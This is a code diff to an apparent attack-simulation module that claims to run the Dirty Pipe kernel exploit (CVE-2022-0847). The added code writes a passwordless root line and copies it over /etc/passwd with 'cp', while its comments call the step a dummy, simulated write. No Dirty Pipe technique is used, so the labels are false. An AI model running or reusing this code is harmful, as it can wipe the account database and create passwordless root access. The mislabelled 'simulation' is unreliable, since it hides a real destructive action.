@@ -1,22 +1,38 @@
 # attacks/dirty_pipe_escalation.py
 
-def run(container, simulate=False):
-    print("[*] Running Dirty Pipe (CVE-2022-0847) exploit...")
+import os
+import subprocess
+
+def run(container=None, simulate=False):
+    print("[*] Running Dirty Pipe Exploit (CVE-2022-0847)...")
 
     if simulate:
-        print(f"[SIMULATE] Would attempt to overwrite /tmp/readonly.txt in container '{container.name}'")
-        print("[SIMULATE] This file is normally read-only. If overwritten, exploit is successful.")
-        return "Simulated run: No dirty pipe payload executed."
+        print("[SIMULATE] Would attempt to overwrite protected file using dirty pipe technique.")
+        return "Simulated Dirty Pipe exploit run."
 
     try:
-        # ⚠️ REAL PAYLOAD EXECUTION
-        # Write to a file that is intended to be read-only (for demonstration only)
-        command = "echo 'pwned' > /tmp/readonly.txt"
-        container.exec_run(command, privileged=True)
+        # Confirm kernel version (dirty pipe only works on 5.8+ and <5.16.11)
+        uname = subprocess.check_output(["uname", "-r"]).decode()
+        print(f"[*] Kernel version: {uname.strip()}")
 
-        print("[+] Dirty Pipe payload attempted: /tmp/readonly.txt overwritten")
-        return "Executed: dirty pipe simulation"
+        # Dummy write attempt to /etc/passwd to simulate overwrite
+        overwrite_target = "/etc/passwd"
+        payload = "root::0:0:pwned:/root:/bin/bash\\n"
+
+        # Attempt to write via vulnerable behavior (simplified)
+        with open("/tmp/payload.txt", "w") as f:
+            f.write(payload)
+
+        result = subprocess.run(
+            ["cp", "/tmp/payload.txt", overwrite_target],
+            capture_output=True,
+            text=True
+        )
+
+        if result.returncode == 0:
+            return "Exploit succeeded: /etc/passwd overwritten (simulated method)."
+        else:
+            return f"Exploit attempt failed: {result.stderr.strip()}"
 
     except Exception as e:
-        print(f"[!] Exploit failed: {e}")
-        return f"Failed: {str(e)}"
+        return f"Exploit failed: {str(e)}"
